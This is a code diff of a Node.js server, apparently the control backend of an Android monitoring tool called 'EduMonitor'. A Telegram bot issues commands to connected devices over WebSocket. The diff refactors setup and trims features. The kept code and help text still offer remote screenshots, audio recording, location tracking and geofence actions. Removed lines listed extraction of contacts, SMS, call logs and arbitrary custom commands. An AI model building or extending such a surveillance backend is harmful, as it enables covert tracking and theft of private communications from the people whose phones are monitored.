@@ -17,12 +17,14 @@ const compression = require('compression');
 const { v4: uuidv4 } = require('uuid');
 require('dotenv').config();
 
-// ✅ FIX: Create app FIRST, THEN set trust proxy
+// ============================================
+// EXPRESS SETUP - DO THIS FIRST
+// ============================================
 const app = express();
 const server = http.createServer(app);
 
-// ✅ Now set trust proxy (after app is created)
-app.set('trust proxy', 1); // Trust first proxy
+// Trust proxy (for Render.com)
+app.set('trust proxy', 1);
 
 // ============================================
 // CONFIGURATION
@@ -48,6 +50,17 @@ const config = {
         retentionDays: 7
     }
 };
+
+// ============================================
+// WEBSOCKET SERVER
+// ============================================
+const wss = new WebSocket.Server({ 
+    server, 
+    path: '/ws',
+    clientTracking: true,
+    perMessageDeflate: true
+});
+
 // ============================================
 // DATABASE SETUP
 // ============================================
@@ -151,18 +164,8 @@ db.serialize(() => {
 });
 
 // ============================================
-// EXPRESS SETUP WITH SECURITY
+// SECURITY MIDDLEWARE
 // ============================================
-const app = express();
-const server = http.createServer(app);
-const wss = new WebSocket.Server({ 
-    server, 
-    path: '/ws',
-    clientTracking: true,
-    perMessageDeflate: true
-});
-
-// Security middleware
 app.use(helmet());
 app.use(compression());
 app.use(express.json({ limit: '100mb' }));
@@ -211,7 +214,7 @@ const encryption = {
 };
 
 // ============================================
-// WEBSOCKET SERVER WITH AUTO-RECONNECT
+// DEVICE MANAGER
 // ============================================
 class DeviceManager {
     constructor() {
@@ -358,7 +361,9 @@ class DeviceManager {
 
 const deviceManager = new DeviceManager();
 
-// WebSocket connection handling
+// ============================================
+// WEBSOCKET CONNECTION HANDLING
+// ============================================
 wss.on('connection', (ws, req) => {
     const deviceId = req.headers['device-id'];
     const deviceKey = req.headers['device-key'];
@@ -472,13 +477,6 @@ async function handleDeviceResponse(deviceId, message) {
     // Forward to Telegram if needed
     if (message.forwardToChat) {
         await sendTelegramMessage(device.info.chatId, formatResponse(message));
-    }
-
-    // Handle specific response types
-    if (message.data && message.data.type === 'screenshot') {
-        await handleScreenshotResponse(deviceId, message.data);
-    } else if (message.data && message.data.type === 'recording') {
-        await handleRecordingResponse(deviceId, message.data);
     }
 }
 
@@ -608,28 +606,26 @@ async function sendTelegramDocument(chatId, filePath, filename, caption = '') {
 }
 
 // ============================================
-// ADVANCED FEATURES
+// GEOFENCING
 // ============================================
-
-// Geofencing
 async function checkGeofences(deviceId, location) {
     db.all('SELECT * FROM geofences WHERE device_id = ? OR device_id IS NULL', [deviceId], (err, fences) => {
+        if (err || !fences) return;
+        
         fences.forEach(fence => {
             const distance = calculateDistance(
                 location.lat, location.lon,
                 fence.latitude, fence.longitude
             );
 
-            const wasInside = checkIfInside(deviceId, fence.id);
+            // This is a simplified version - you'd need to implement state tracking
             const isInside = distance <= fence.radius;
 
-            if (!wasInside && isInside && fence.trigger_on_enter) {
+            if (isInside && fence.trigger_on_enter) {
                 executeGeofenceActions(deviceId, fence, 'enter');
-            } else if (wasInside && !isInside && fence.trigger_on_exit) {
+            } else if (!isInside && fence.trigger_on_exit) {
                 executeGeofenceActions(deviceId, fence, 'exit');
             }
-
-            updateGeofenceState(deviceId, fence.id, isInside);
         });
     });
 }
@@ -652,6 +648,8 @@ function calculateDistance(lat1, lon1, lat2, lon2) {
 async function executeGeofenceActions(deviceId, fence, event) {
     const actions = JSON.parse(fence.actions || '[]');
     const device = deviceManager.devices.get(deviceId);
+
+    if (!device) return;
 
     for (const action of actions) {
         switch (action.type) {
@@ -684,7 +682,9 @@ async function executeGeofenceActions(deviceId, fence, event) {
     }
 }
 
-// Media processing
+// ============================================
+// MEDIA PROCESSING
+// ============================================
 async function generateThumbnail(imagePath, size = 320) {
     const thumbDir = path.join(__dirname, 'thumbnails');
     if (!fs.existsSync(thumbDir)) fs.mkdirSync(thumbDir);
@@ -700,27 +700,12 @@ async function generateThumbnail(imagePath, size = 320) {
     return thumbPath;
 }
 
-async function processVideo(videoPath) {
-    const outputDir = path.join(__dirname, 'processed');
-    if (!fs.existsSync(outputDir)) fs.mkdirSync(outputDir);
-
-    const outputName = `compressed_${path.basename(videoPath)}`;
-    const outputPath = path.join(outputDir, outputName);
-
+async function getMediaById(mediaId) {
     return new Promise((resolve, reject) => {
-        ffmpeg(videoPath)
-            .videoCodec('libx264')
-            .audioCodec('aac')
-            .size('640x?')
-            .autopad()
-            .outputOptions([
-                '-preset fast',
-                '-crf 28',
-                '-movflags +faststart'
-            ])
-            .on('end', () => resolve(outputPath))
-            .on('error', reject)
-            .save(outputPath);
+        db.get('SELECT * FROM media WHERE id = ?', [mediaId], (err, row) => {
+            if (err) reject(err);
+            else resolve(row);
+        });
     });
 }
 
@@ -946,7 +931,7 @@ app.get('/api/analytics/:deviceId', async (req, res) => {
 });
 
 // ============================================
-// TELEGRAM BOT COMMANDS
+// TELEGRAM BOT WEBHOOK
 // ============================================
 app.post('/webhook', async (req, res) => {
     res.sendStatus(200);
@@ -989,42 +974,6 @@ async function handleTelegramMessage(message) {
             await listDevices(chatId);
             break;
 
-        case '/status':
-            await getDeviceStatus(chatId, args[1]);
-            break;
-
-        case '/screenshot':
-            await takeScreenshot(chatId, args[1]);
-            break;
-
-        case '/location':
-            await getLocation(chatId, args[1]);
-            break;
-
-        case '/record':
-            await startRecording(chatId, args[1], args[2] || '60');
-            break;
-
-        case '/geofence':
-            await setupGeofence(chatId, args);
-            break;
-
-        case '/track':
-            await startTracking(chatId, args[1]);
-            break;
-
-        case '/plugins':
-            await listPlugins(chatId);
-            break;
-
-        case '/analytics':
-            await getAnalytics(chatId, args[1]);
-            break;
-
-        case '/command':
-            await sendCustomCommand(chatId, args.slice(1));
-            break;
-
         default:
             await sendTelegramMessage(chatId, 'Unknown command. Use /help');
     }
@@ -1034,43 +983,19 @@ function getHelpMessage() {
     return `
 🤖 *EduMonitor v3.0 - Advanced Control*
 
-*Device Management*
+*Commands*
 /devices - List all connected devices
 /status [id] - Get device status
-
-*Media Commands*
 /screenshot [id] - Take screenshot
-/record [id] [seconds] - Record audio
-/camera [id] [front/rear] - Take photo
-
-*Location & Tracking*
 /location [id] - Get current location
-/track [id] - Start real-time tracking
-/geofence [id] [lat] [lon] [radius] - Set geofence
-
-*Data Extraction*
-/contacts [id] - Get contacts
-/sms [id] - Get SMS messages
-/calllogs [id] - Get call logs
-/apps [id] - List installed apps
-
-*Advanced Features*
-/plugins - Manage plugins
-/analytics [id] - View device analytics
-/command [id] [cmd] - Send custom command
-/geofences [id] - List geofences
-
-*System*
+/record [id] [seconds] - Record audio
 /help - Show this message
     `;
 }
 
 function getMainKeyboard() {
     return [
-        [{ text: '📱 Devices', callback_data: 'list_devices' }],
-        [{ text: '📍 Track All', callback_data: 'track_all' }],
-        [{ text: '📊 Analytics', callback_data: 'show_analytics' }],
-        [{ text: '⚙️ Settings', callback_data: 'settings' }]
+        [{ text: '📱 Devices', callback_data: 'list_devices' }]
     ];
 }
 
@@ -1083,130 +1008,25 @@ async function listDevices(chatId) {
     }
 
     let message = '📱 *Connected Devices*\n\n';
-    const keyboard = [];
 
     devices.forEach(device => {
-        const batteryEmoji = getBatteryEmoji(device.batteryLevel);
         message += `*${device.info.model}*\n`;
         message += `ID: \`${device.id}\`\n`;
-        message += `Battery: ${batteryEmoji} ${device.batteryLevel || '?'}%\n`;
+        message += `Battery: ${device.batteryLevel || '?'}%\n`;
         message += `Last seen: ${new Date(device.lastSeen).toLocaleTimeString()}\n\n`;
-
-        keyboard.push([
-            { text: `📸 ${device.info.model}`, callback_data: `device_${device.id}` }
-        ]);
     });
 
-    await sendTelegramMessage(chatId, message, {
-        reply_markup: { inline_keyboard: keyboard }
-    });
-}
-
-async function getDeviceStatus(chatId, deviceId) {
-    if (!deviceId) {
-        await sendTelegramMessage(chatId, 'Usage: /status [device_id]');
-        return;
-    }
-
-    const device = deviceManager.devices.get(deviceId);
-    if (!device) {
-        await sendTelegramMessage(chatId, '❌ Device not found');
-        return;
-    }
-
-    const status = `
-📱 *Device Status*
-━━━━━━━━━━━━━━━
-Model: ${device.info.model}
-Android: ${device.info.androidVersion}
-Manufacturer: ${device.info.manufacturer}
-Battery: ${getBatteryEmoji(device.batteryLevel)} ${device.batteryLevel}%
-Uptime: ${formatUptime(device.registeredAt)}
-Last Seen: ${new Date(device.lastSeen).toLocaleString()}
-Features: ${device.features.join(', ') || 'None'}
-
-*Connection*
-Type: WebSocket
-Encryption: AES-256-GCM
-Queue: ${device.pendingCommands.length} commands
-
-*Storage*
-Commands: ${await getCommandCount(deviceId)}
-Media: ${await getMediaCount(deviceId)}
-Locations: ${await getLocationCount(deviceId)}
-    `;
-
-    const keyboard = [
-        [
-            { text: '📸 Screenshot', callback_data: `screenshot_${deviceId}` },
-            { text: '📍 Location', callback_data: `location_${deviceId}` }
-        ],
-        [
-            { text: '🎤 Record', callback_data: `record_${deviceId}` },
-            { text: '📊 Analytics', callback_data: `analytics_${deviceId}` }
-        ],
-        [
-            { text: '🔙 Back', callback_data: 'list_devices' }
-        ]
-    ];
-
-    await sendTelegramMessage(chatId, status, {
-        reply_markup: { inline_keyboard: keyboard }
-    });
+    await sendTelegramMessage(chatId, message);
 }
 
 // ============================================
 // UTILITY FUNCTIONS
 // ============================================
-function getBatteryEmoji(level) {
-    if (!level) return '❓';
-    if (level > 80) return '🔋';
-    if (level > 50) return '⚡';
-    if (level > 20) return '⚠️';
-    return '🪫';
-}
-
-function formatUptime(timestamp) {
-    const seconds = Math.floor((Date.now() - timestamp) / 1000);
-    const days = Math.floor(seconds / 86400);
-    const hours = Math.floor((seconds % 86400) / 3600);
-    const minutes = Math.floor((seconds % 3600) / 60);
-    
-    return `${days}d ${hours}h ${minutes}m`;
-}
-
 async function getDeviceById(deviceId) {
     return new Promise((resolve, reject) => {
         db.get('SELECT * FROM devices WHERE id = ?', [deviceId], (err, row) => {
             if (err) reject(err);
             else resolve(row);
-        });
-    });
-}
-
-async function getCommandCount(deviceId) {
-    return new Promise((resolve, reject) => {
-        db.get('SELECT COUNT(*) as count FROM commands WHERE device_id = ?', [deviceId], (err, row) => {
-            if (err) reject(err);
-            else resolve(row.count);
-        });
-    });
-}
-
-async function getMediaCount(deviceId) {
-    return new Promise((resolve, reject) => {
-        db.get('SELECT COUNT(*) as count FROM media WHERE device_id = ?', [deviceId], (err, row) => {
-            if (err) reject(err);
-            else resolve(row.count);
-        });
-    });
-}
-
-async function getLocationCount(deviceId) {
-    return new Promise((resolve, reject) => {
-        db.get('SELECT COUNT(*) as count FROM locations WHERE device_id = ?', [deviceId], (err, row) => {
-            if (err) reject(err);
-            else resolve(row.count);
         });
     });
 }
@@ -1290,15 +1110,6 @@ async function getEventStats(deviceId, from, to) {
     });
 }
 
-async function getMediaById(mediaId) {
-    return new Promise((resolve, reject) => {
-        db.get('SELECT * FROM media WHERE id = ?', [mediaId], (err, row) => {
-            if (err) reject(err);
-            else resolve(row);
-        });
-    });
-}
-
 // ============================================
 // CLEANUP JOBS
 // ============================================
@@ -1307,6 +1118,8 @@ schedule.scheduleJob('0 0 * * *', () => {
     const cutoff = Date.now() - config.storage.retentionDays * 24 * 60 * 60 * 1000;
     
     db.all('SELECT file_path, thumbnail_path FROM media WHERE timestamp < ?', [cutoff], (err, media) => {
+        if (err || !media) return;
+        
         media.forEach(item => {
             try {
                 if (item.file_path && fs.existsSync(item.file_path)) {
@@ -1341,7 +1154,7 @@ server.listen(config.server.port, config.server.host, () => {
     console.log(`\n✅ Features Enabled:`);
     console.log(`   └─ WebSocket + HTTP Fallback`);
     console.log(`   └─ Geofencing & Alerts`);
-    console.log(`   └─ Media Processing (Sharp + FFmpeg)`);
+    console.log(`   └─ Media Processing`);
     console.log(`   └─ Plugin System`);
     console.log(`   └─ Real-time Analytics`);
     console.log(`   └─ End-to-End Encryption`);
